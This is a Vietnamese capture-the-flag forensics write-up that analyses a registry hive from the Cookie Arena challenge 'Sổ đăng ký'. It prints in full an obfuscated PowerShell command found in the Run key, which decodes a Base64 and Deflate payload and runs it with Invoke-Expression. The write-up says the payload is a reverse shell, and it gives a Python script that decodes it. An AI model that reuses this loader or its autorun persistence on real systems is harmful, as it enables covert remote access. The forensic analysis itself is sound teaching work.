---
title: Sodangky challenge

---

### Sodangky challenge

Link challenge: [Sổ đăng ký - Cookie Arena](https://battle.cookiearena.org/challenges/digital-forensics/so-dang-ky)
![image](https://hackmd.io/_uploads/r1jEfMhWbl.png)


- Khi ta giải nén challenge, ta thấy một file .DAT

![image](https://hackmd.io/_uploads/B1ISzMnWZx.png)


- Trước hết ta sẽ kiểm tra loại dữ liệu của file này là gì bằng lệnh *file:*


![image](https://hackmd.io/_uploads/SyqWXGhWWg.png)

Hình 1. Kiểm tra kiểu file NTUSER.DAT bằng lệnh file

- Lệnh file này có chức năng là cho dù có đổi tên file thành dạng gì thì nó cũng đều phát hiện ra dạng file gốc, ở đây ta thấy file này là file registry.
- Bây giờ ta cần khai thác dữ liệu bị ẩn bên trong file registry này, ta sẽ dùng công cụ forensics để khai thác, ở đây ta có thể dùng Autopsy hoặc Registry Explorer thì đều có thể tìm flag cho bài này.
- Mình sẽ dùng Autopsy để khai thác file registry hive này. Autopsy là một GUI dựa trên TSK và là một nền tảng pháp y mạnh mẽ. Autopsy có khả năng phân tích và phân loại các file Registry Hive một cách tự động.



Hình 2. Giao diện Autopsy sau khi mở file NTUSER.DAT

- Với kiến thức sẵn có, tôi sẽ đi lần mò khóa registry phổ biến nhất là *Software\Microsoft\Windows\CurrentVersion\Run,*
- Khóa Registry **`Software\Microsoft\Windows\CurrentVersion\Run`** rất đặc biệt vì nó là một trong những vị trí chính và phổ biến nhất mà Windows sử dụng để xác định các chương trình sẽ tự động khởi động khi một người dùng đăng nhập.
- Ta mò một lúc thì thấy có giá trị Updater ở bên trong, chứa một command rất kỳ lạ

![image](https://hackmd.io/_uploads/B1qPMMnbbg.png)

Hình 3. Chuỗi command Powershell “đáng nghi” trong khóa Registry

- Giờ ta có thể qua Registry Explorer để xem rõ hơn (mình thấy giao diện dễ nhìn hơn ^.^)

![image](https://hackmd.io/_uploads/HJQjfzhW-l.png)


Hình 4. Chuỗi lệnh powershell đáng nghi đầy đủ

```php
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon”
```

!!! Wow, một dãy lệnh powershell được làm rối, nhưng chỉ cần tinh ý một chút ta sẽ dễ dàng nhận ra ngay cách mà lệnh này triển khai như thế nào:

- Mình sẽ mô tả chi tiết như sau:
    
Bảng 1. Giải thích từng thành phần trong chuỗi lệnh powershell đáng nghi
    

| Thành phần | Kỹ thuật được sử dụng | Ý nghĩa  |
| --- | --- | --- |
| `"C:\Windows\...\powershell.exe"` | Khởi chạy PowerShell |  |
|  |  |  |
| `[coNVeRT]::FRoMBAse64stRInG(...)` | Mã hóa Base64 | Chuỗi ký tự dài ('TVFva4JAGP8q...') được giải mã thành một mảng byte nhị phân. |
| `io.COMprEssIon.dEFlATesTReAm(...)` | Nén Deflate | Mảng byte nhị phân (sau khi Base64) được giải nén bằng thuật toán Deflate.  |
| **` | FOREAcH-object{ neW-obJEct io.streAMrEadeR( ... )}).reaDToEnD()`** | Đọc Stream |
| **` | inVOKe-exprEsSIon`** (IEX) | Thực thi trong bộ nhớ  |

- Ở đây, ta nhận thấy rằng chuỗi ký tự dài ('TVFva4JAGP8q...') được làm rối hai lần:
    - Lần 1: Mã hóa base 64
    - Lần 2: sau khi mã hóa base64 xong, kết quả được nén bằng thuật toán Deflate
- Ở đây, mình sẽ tạo một file python decode.py để giải mã thông điệp:

```php
import zlib
import base64

# Chuỗi Base64 đã mã hóa payload (tải trọng)
encoded_b64 = 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='

# 1. Giải mã Base64 thành byte nhị phân
decoded_bytes = base64.b64decode(encoded_b64)

# 2. Giải nén Deflate thô: zlib.decompress với đối số âm (-zlib.MAX_WBITS)
decompressed_data = zlib.decompress(decoded_bytes, -zlib.MAX_WBITS)

# 3. Chuyển byte thành chuỗi ASCII (mã PowerShell đã giải mã)
decoded_powershell = decompressed_data.decode('ascii')

print(decoded_powershell)
```

Hình 5. Đoạn code python để giải mã message*

- Sau khi chạy file này, ta sẽ nhận được đầy đủ thông tin của message này

![image](https://hackmd.io/_uploads/SJZ0fGnZWe.png)


*Hình 6. Câu lệnh reverse shell được nhúng trong đoạn mã powershell , chứa flag*

⇒ Wow, ta đã tìm được flag được nhúng trong lệnh reverse shell. -.-